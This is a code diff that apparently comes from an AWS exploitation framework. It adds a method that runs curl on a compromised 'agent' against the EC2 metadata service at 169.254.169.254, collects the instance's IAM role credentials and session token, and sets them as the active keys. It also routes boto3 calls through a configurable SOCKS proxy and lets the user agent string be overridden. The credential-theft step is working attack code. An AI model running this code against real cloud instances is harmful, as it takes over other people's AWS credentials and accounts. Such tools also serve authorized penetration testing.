@@ -967,27 +967,54 @@ class Main:
             print('\nNo modules found.')
         print('')
 
-    def set_keys(self):
+    def fetch_ec2_keys(self, target, conn):
+        instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', mute=True)
+        if not instance_profile == '' and 'not found' not in instance_profile:
+            keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', mute=True)
+            if '"Code" : "Success",' in keys:
+                keys = json.loads(keys)
+                self.set_keys(f'Agent{target}/{time.strftime("%m-%d@%I-%M%p")}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
+                self.print(f'Keys successfully fetched from agent {target}\'s EC2 meta-data and set as the active key pair. They will expire at {keys["Expiration"]}.\n')
+                return
+        self.print('Failed to fetch AWS keys from the EC2 meta-data, this agent is either not an EC2 instance or it does not have a valid instance profile attached to it to fetch the keys from.\n')
+        return
+
+    def set_keys(self, key_alias=None, access_key_id=None, secret_access_key=None, session_token=None):
         session = self.get_active_session()
 
-        self.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')
+        # If key_alias is None, then it's being run normally from the command line (set_keys),
+        # otherwise it means it is set programmatically and we don't want any prompts if it is
+        # done programatically
+        if key_alias is None:
+            self.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')
 
         # Key alias
-        new_value = self.input(f'Key alias [{session.key_alias}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Key alias [{session.key_alias}]: ')
+        else:
+            new_value = key_alias
+            self.print(f'Key alias [{session.key_alias}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.key_alias = None
         elif str(new_value) != '':
             session.key_alias = new_value
 
         # Access key ID
-        new_value = self.input(f'Access key ID [{session.access_key_id}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Access key ID [{session.access_key_id}]: ')
+        else:
+            new_value = access_key_id
+            self.print(f'Access key ID [{session.access_key_id}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.access_key_id = None
         elif str(new_value) != '':
             session.access_key_id = new_value
 
         # Secret access key (should not be entered in log files)
-        new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
+        if key_alias is None:
+            new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
+        else:
+            new_value = secret_access_key
         self.print('Secret access key [******]: ****** (Censored)', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.secret_access_key = None
@@ -995,7 +1022,11 @@ class Main:
             session.secret_access_key = new_value
 
         # Session token (optional)
-        new_value = self.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ')
+        else:
+            new_value = session_token
+            self.print(f'Access key ID [{session.session_token}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.session_token = None
         elif str(new_value) != '':
@@ -1020,7 +1051,9 @@ class Main:
         self.database.add(aws_key)
 
         self.database.commit()
-        self.print('Configuration variables have been set.')
+
+        if key_alias is None:
+            self.print('Configuration variables have been set.\n')
 
     def swap_keys(self):
         session = self.get_active_session()
@@ -1130,9 +1163,15 @@ class Main:
 
         return session, global_data_in_all_frames, local_data_in_all_frames
 
-    def get_boto3_client(self, service, region=None):
+    def get_boto3_client(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
         session = self.get_active_session()
         proxy_settings = self.get_proxy_settings()
+
+        boto_config = botocore.config.Config(
+            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            user_agent=user_agent,  # If user_agent=None, botocore will use the real UA which is what we want
+            parameter_validation=parameter_validation
+        )
 
         return boto3.client(
             service,
@@ -1140,20 +1179,27 @@ class Main:
             aws_access_key_id=session.access_key_id,
             aws_secret_access_key=session.secret_access_key,
             aws_session_token=session.session_token,
-            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+            config=boto_config
         )
 
-    def get_boto3_resource(self, service, region=None):
+    def get_boto3_resource(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
+        # All the comments from get_boto3_client apply here too
         session = self.get_active_session()
         proxy_settings = self.get_proxy_settings()
 
+        boto_config = botocore.config.Config(
+            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            user_agent=user_agent,
+            parameter_validation=parameter_validation
+        )
+
         return boto3.resource(
             service,
-            region_name=region,  # Whether region has a value or is None, it will work here
+            region_name=region,
             aws_access_key_id=session.access_key_id,
             aws_secret_access_key=session.secret_access_key,
             aws_session_token=session.session_token,
-            config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
+            config=boto_config
         )
 
     def initialize_tab_completion(self):
